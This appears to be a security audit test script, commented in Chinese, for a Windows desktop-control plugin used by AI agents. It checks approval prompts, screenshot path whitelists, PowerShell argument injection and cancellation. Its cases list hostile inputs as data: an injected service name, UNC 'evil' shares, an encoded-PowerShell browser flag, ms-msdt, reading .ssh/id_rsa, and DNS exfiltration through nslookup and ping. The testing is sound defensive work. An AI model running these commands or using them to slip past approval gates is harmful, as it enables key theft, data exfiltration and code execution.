/**
 * 复核脚本 v3。
 * 规矩：每条断言都必须在「修复前」会失败，且不产生破坏性副作用。
 *
 * 运行：ELECTRON_RUN_AS_NODE=1 <electron> test/audit.mjs
 */

import { apply } from '../index.js'
import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = dirname(fileURLToPath(import.meta.url))
const tools = new Map()
const approvalCalls = []
let approvalOutcome = 'allowed-once'
const disposers = []

const ctx = {
  logger: { info: () => {}, warn: () => {} },
  tools: {
    register: (definition) => {
      tools.set(definition.name, definition)
      return () => tools.delete(definition.name)
    },
  },
  get: (name) => {
    if (name === 'systemPrompt') return { section: () => {} }
    if (name === 'approval') {
      return {
        request: async (request) => {
          approvalCalls.push(request)
          return approvalOutcome
        },
      }
    }
    return undefined
  },
  effect: (factory) => {
    const dispose = factory()
    if (typeof dispose === 'function') disposers.push(dispose)
    return dispose
  },
}

apply(ctx, {})

let failures = 0
function check(label, condition, detail) {
  if (condition) console.log(`  ok   ${label}`)
  else { failures++; console.log(`  FAIL ${label}${detail ? ` — ${detail}` : ''}`) }
}
function section(name) { console.log(`\n== ${name} ==`) }

const exec = { agent: { id: 'audit' }, callId: 'c1', rootCallId: 'c1', signal: new AbortController().signal }

async function invoke(name, args, execOverride) {
  const definition = tools.get(name)
  if (!definition) throw new Error(`missing tool ${name}`)
  const value = await definition.execute(args, execOverride ?? exec)
  const content = definition.output.render(args, value)
  return { value, text: content.map((b) => b.text ?? '').join('\n') }
}
async function expectThrow(label, name, args, execOverride) {
  try {
    await invoke(name, args, execOverride)
    check(label, false, '没有抛错')
    return undefined
  } catch (error) {
    check(label, true)
    return error.message
  }
}

// ---------------------------------------------------------------------------
section('B1 · 打包完整性：package.json 不能带 BOM')
// ---------------------------------------------------------------------------
{
  const bytes = readFileSync(join(HERE, '..', 'package.json'))
  const hasBom = bytes.length >= 3 && bytes[0] === 0xEF && bytes[1] === 0xBB && bytes[2] === 0xBF
  check('package.json 无 UTF-8 BOM', !hasBom, hasBom ? '带 BOM 会导致 DSH 跳过整个 bundle' : '')
  let parsed
  try {
    parsed = JSON.parse(bytes.toString('utf8').replace(/^\uFEFF/, ''))
    check('package.json 可解析', true)
  } catch (error) {
    check('package.json 可解析', false, error.message)
    parsed = {}
  }
  check('version 与报告一致（1.1.4）', parsed.version === '1.1.4', `实际 ${parsed.version}`)
}

// ---------------------------------------------------------------------------
section('A1 · 审批框不截断命令（修复前会被 truncate 截掉）')
// ---------------------------------------------------------------------------
{
  const marker = 'A'.repeat(1200)
  // 用 New-Item 建临时目录触发审批：原版是 Remove-Item，批准后会真的删东西。
  const probeDir = join(process.env.TEMP ?? '.', `dc-audit-probe-${Date.now()}`)
  const longCommand = `New-Item -ItemType Directory -Path "${probeDir}" -Force ; Write-Output "${marker}"`
  approvalOutcome = 'allowed-once'
  approvalCalls.length = 0
  await invoke('pc_system', { action: 'exec', command: longCommand })
  const call = approvalCalls.at(-1)
  const shown = String(call?.displayReason?.zh ?? '')
  check('审批被请求', Boolean(call))
  check('审批文案包含完整命令', shown.includes(marker), `长度=${shown.length}`)
  check('审批文案没有「省略」', !shown.includes('省略'))
}

// ---------------------------------------------------------------------------
section('A2 · 截图路径：类型、覆盖、目录白名单')
// ---------------------------------------------------------------------------
{
  const err = await expectThrow('拒绝非 .png 目标', 'pc_screen', { action: 'grab', path: 'C:\\Windows\\evil.docx' })
  check('错误信息提到 .png', /png/i.test(String(err)), String(err))

  const err2 = await expectThrow('拒绝覆盖已存在文件', 'pc_screen', {
    action: 'grab',
    path: join(HERE, 'live4-bg-ok.png'),
  })
  check('错误信息提到已存在', /已存在|覆盖/.test(String(err2)), String(err2))

  // 目录白名单：不在截图目录、不在工作目录、文件不存在 —— 必须被拒
  const err3 = await expectThrow('拒绝工作区外的路径', 'pc_screen', {
    action: 'grab',
    path: 'C:\\__dc_audit_outside__\\probe.png',
  })
  check('错误信息提到目录', /目录|只能写到/.test(String(err3)), String(err3))
}

// ---------------------------------------------------------------------------
section('A4 · PowerShell 参数位注入防护（U+2019 是旧版挡不住的那个）')
// ---------------------------------------------------------------------------
{
  approvalOutcome = 'allowed-once'
  const hostile = `x\u2019; Write-Output PWNED; \u2018`
  let message = ''
  let value
  try {
    const result = await invoke('pc_system', { action: 'service', serviceName: hostile, serviceAction: 'status' })
    value = result.value
  } catch (error) {
    message = error.message
  }
  const output = `${value?.stdout ?? ''}${value?.stderr ?? ''}`
  check('U+2019 注入未执行（没有独立输出行）', !/^PWNED$/m.test(output), `out=${output.slice(0, 200)}`)
  check('输入被当作字面服务名（不是语法错误）', !/ParserError|缺少终止符|Unexpected token/i.test(output + message), `msg=${message.slice(0, 160)}`)
}

// ---------------------------------------------------------------------------
section('A4b · psArg 在参数位真的能用（修复前这里全坏）')
// ---------------------------------------------------------------------------
{
  let value
  let message = ''
  try {
    const result = await invoke('pc_system', { action: 'service', serviceName: 'Spooler', serviceAction: 'status' })
    value = result.value
  } catch (error) {
    message = error.message
  }
  const out = `${value?.stdout ?? ''}`
  check('service status 没有报参数绑定错误', !/PositionalParameterNotFound|positional parameter cannot be found/i.test(out + message), `${out.slice(0, 200)}${message}`)
  check('service status 确实查到了 Spooler', out.includes('Spooler'), out.slice(0, 200))
  check('退出码为 0', value?.exitCode === 0, `exit=${value?.exitCode}`)

  let reg
  let regMessage = ''
  try {
    const result = await invoke('pc_system', {
      action: 'registry',
      registryAction: 'read',
      registryKey: 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion',
      registryName: 'ProductName',
    })
    reg = result.value
  } catch (error) {
    regMessage = error.message
  }
  const regOut = `${reg?.stdout ?? ''}`
  check('registry read 没有报参数绑定错误', !/PositionalParameterNotFound/i.test(regOut + regMessage), `${regOut.slice(0, 160)}${regMessage}`)
  check('registry read 读到了 ProductName', /ProductName|Windows/i.test(regOut), regOut.slice(0, 200))
}

// ---------------------------------------------------------------------------
section('A5 · pc_batch 响应取消（含中途取消）')
// ---------------------------------------------------------------------------
{
  const preAborted = new AbortController()
  preAborted.abort()
  const preExec = { agent: { id: 'audit' }, callId: 'c2', rootCallId: 'c2', signal: preAborted.signal }
  const before = await invoke('pc_pointer', { action: 'position' })
  const err = await expectThrow('已取消时立即中止', 'pc_batch', {
    steps: [{ op: 'wait', ms: 50 }, { op: 'type', text: 'must not run' }],
  }, preExec)
  check('错误信息说明是取消', /取消/.test(String(err)), String(err))
  const after = await invoke('pc_pointer', { action: 'position' })
  check('未执行实际动作（光标未移动）', before.value?.x === after.value?.x && before.value?.y === after.value?.y)

  const midController = new AbortController()
  const midExec = { agent: { id: 'audit' }, callId: 'c3', rootCallId: 'c3', signal: midController.signal }
  setTimeout(() => midController.abort(), 150)
  const started = Date.now()
  const midErr = await expectThrow('中途取消时 wait 被唤醒', 'pc_batch', {
    steps: [{ op: 'wait', ms: 5000 }],
  }, midExec)
  const elapsed = Date.now() - started
  check('中断耗时远小于 5 秒', elapsed < 1500, `实际 ${elapsed}ms`)
  check('中途取消也报「取消」', /取消/.test(String(midErr)), String(midErr))
}

// ---------------------------------------------------------------------------
section('A6 · 后台组合键明确报错')
// ---------------------------------------------------------------------------
{
  const windows = await invoke('pc_window', { action: 'list' })
  const target = (windows.value?.windows || [])[0]
  if (!target) {
    check('找到一个可用于测试的窗口', false, '当前没有可见窗口')
  } else {
    const err = await expectThrow('后台 ctrl+a 报错', 'pc_keyboard', {
      action: 'press',
      mode: 'background',
      hwnd: target.hwnd,
      keys: 'ctrl+a',
    })
    check('错误信息提示改用前台模式', /前台/.test(String(err)), String(err))
  }
}

// ---------------------------------------------------------------------------
section('A7 · SetLastError（静态检查，避免健康机器上恒真）')
// ---------------------------------------------------------------------------
{
  const info = await invoke('pc_system', { action: 'info' })
  const probe = info.value?.inputProbe
  check('inputProbe 存在', Boolean(probe) && typeof probe === 'object')
  check('带 setCursorError 与 sendInputError', probe && 'setCursorError' in probe && 'sendInputError' in probe, JSON.stringify(probe))

  // 原断言「setCursor 成功或错误码非 0」在健康机器上修复前也成立，没有区分度。
  // 直接检查源码里的 DllImport 属性：缺 SetLastError 时 GetLastWin32Error 恒为 0。
  const source = readFileSync(join(HERE, '..', 'native', 'DesktopControl.cs'), 'utf8')
  const at = source.indexOf('extern bool SetCursorPos')
  const windowText = at >= 0 ? source.slice(Math.max(0, at - 220), at) : ''
  check('SetCursorPos 声明带 SetLastError = true', /SetLastError\s*=\s*true/.test(windowText), at >= 0 ? windowText.trim().slice(-80) : '未找到声明')
}

// ---------------------------------------------------------------------------
section('A8 · 白名单行为面（三轮评审的绕过全收）')
// ---------------------------------------------------------------------------
{
  approvalOutcome = 'rejected'
  const cases = [
    ['notepad（裸名）免审批', 'pc_app', { action: 'launch', target: 'notepad' }, false],
    ['https 网址免审批', 'pc_app', { action: 'launch', target: 'https://example.com' }, false],
    ['cmd 需审批', 'pc_app', { action: 'launch', target: 'cmd' }, true],
    ['cmd.exe. 需审批', 'pc_app', { action: 'launch', target: 'cmd.exe.' }, true],
    ['任意路径 exe 需审批', 'pc_app', { action: 'launch', target: 'C:\\Windows\\System32\\notepad.exe' }, true],
    ['explorer + payload.bat 需审批', 'pc_app', { action: 'launch', target: 'explorer.exe', args: 'C:\\Users\\Public\\payload.bat' }, true],
    ['explorer + UNC 需审批', 'pc_app', { action: 'launch', target: 'explorer.exe', args: '\\\\evil\\share\\x.exe' }, true],
    ['code --extensionDevelopmentPath 需审批', 'pc_app', { action: 'launch', target: 'code', args: '--extensionDevelopmentPath=C:\\evil' }, true],
    ['chrome --utility-cmd-prefix 需审批', 'pc_app', { action: 'launch', target: 'chrome', args: '--utility-cmd-prefix=powershell -EncodedCommand x' }, true],
    ['ms-msdt 协议需审批', 'pc_app', { action: 'launch', target: 'ms-msdt:/id PCWDiagnostic' }, true],
    ['file:// 文档需审批', 'pc_app', { action: 'launch', target: 'file://evil/share/a.pdf' }, true],
    ['file:// 文件夹需审批', 'pc_app', { action: 'launch', target: 'file://evil/share/' }, true],
    ['mailto 带 UNC 附件需审批', 'pc_app', { action: 'launch', target: 'mailto:a@b.c?attach=\\\\evil\\share\\x' }, true],
    ['UNC 文档需审批', 'pc_app', { action: 'launch', target: '\\\\evil\\share\\a.docx' }, true],
    ['.doc（可带宏）需审批', 'pc_app', { action: 'launch', target: 'C:\\Temp\\a.doc' }, true],
    ['.iso（会挂载）需审批', 'pc_app', { action: 'launch', target: 'C:\\Temp\\a.iso' }, true],
    ['命令名带路径需审批', 'pc_system', { action: 'exec', command: '.\\whoami.exe' }, true],
    ['反斜杠 UNC 需审批', 'pc_system', { action: 'exec', command: '\\\\evil\\s\\whoami.exe' }, true],
    ['正斜杠 UNC 需审批', 'pc_system', { action: 'exec', command: 'type //evil/share/x' }, true],
    ['route print 需审批', 'pc_system', { action: 'exec', command: 'route print' }, true],
    ['arp -a 需审批', 'pc_system', { action: 'exec', command: 'arp -a' }, true],
    ['get-content 需审批（读私钥风险）', 'pc_system', { action: 'exec', command: 'get-content C:\\Users\\x\\.ssh\\id_rsa' }, true],
    ['systeminfo /s 需审批（外联）', 'pc_system', { action: 'exec', command: 'systeminfo /s evilhost' }, true],
    ['tasklist /s 需审批（外联）', 'pc_system', { action: 'exec', command: 'tasklist /s evilhost' }, true],
    ['get-wmiobject -ComputerName 需审批', 'pc_system', { action: 'exec', command: 'get-wmiobject win32_operatingsystem -ComputerName evilhost' }, true],
    ['nslookup 需审批（网络工具）', 'pc_system', { action: 'exec', command: 'nslookup secret.evil.example' }, true],
    ['ver 需审批（已移出白名单）', 'pc_system', { action: 'exec', command: 'ver' }, true],
    ['time 需审批（已移出白名单）', 'pc_system', { action: 'exec', command: 'time' }, true],
    // 第四轮：远程参数的其它写法（以前只认「参数后跟空格」）
    ['quser /server:host 需审批', 'pc_system', { action: 'exec', command: 'quser /server:evilhost' }, true],
    ['tasklist /S:host 需审批', 'pc_system', { action: 'exec', command: 'tasklist /S:evilhost' }, true],
    ['get-wmiobject -ComputerName:host 需审批', 'pc_system', { action: 'exec', command: 'get-wmiobject win32_os -ComputerName:evilhost' }, true],
    ['get-ciminstance -CN 需审批', 'pc_system', { action: 'exec', command: 'get-ciminstance win32_os -CN evilhost' }, true],
    ['get-wmiobject -Comp 缩写需审批', 'pc_system', { action: 'exec', command: 'get-wmiobject win32_os -Comp evilhost' }, true],
    // 第四轮：网络类命令移出白名单
    ['ping 需审批（DNS 外带）', 'pc_system', { action: 'exec', command: 'ping secret.evil.example' }, true],
    ['tracert 需审批', 'pc_system', { action: 'exec', command: 'tracert secret.evil.example' }, true],
    ['pathping 需审批', 'pc_system', { action: 'exec', command: 'pathping secret.evil.example' }, true],
    ['netstat 需审批', 'pc_system', { action: 'exec', command: 'netstat -an' }, true],
    // 第四轮：无 // 的 file: 前缀
    ['file:\\ 无斜杠需审批', 'pc_app', { action: 'launch', target: 'file:\\evil\share\a.pdf' }, true],
    // 参数白名单的正向用例：已知安全选项仍免审批
    ['whoami /groups 免审批', 'pc_system', { action: 'exec', command: 'whoami /groups' }, false],
    ['ipconfig /all 免审批', 'pc_system', { action: 'exec', command: 'ipconfig /all' }, false],
    ['dir C:\\Windows 免审批', 'pc_system', { action: 'exec', command: 'dir C:\\Windows' }, false],
    ['whoami 免审批', 'pc_system', { action: 'exec', command: 'whoami' }, false],
    ['ipconfig 免审批', 'pc_system', { action: 'exec', command: 'ipconfig' }, false],
  ]
  for (const [label, tool, args, shouldAsk] of cases) {
    const before = approvalCalls.length
    let threw = false
    try { await invoke(tool, args) } catch { threw = true }
    const asked = approvalCalls.length > before
    check(label, shouldAsk ? asked : !asked, `threw=${threw} asked=${asked}`)
  }
}

console.log('\n== 清理 ==')
for (const dispose of disposers) {
  try { dispose() } catch { /* ignore */ }
}
console.log(`\n结果：${failures === 0 ? '全部通过' : `${failures} 项失败`}`)
process.exit(failures === 0 ? 0 : 1)
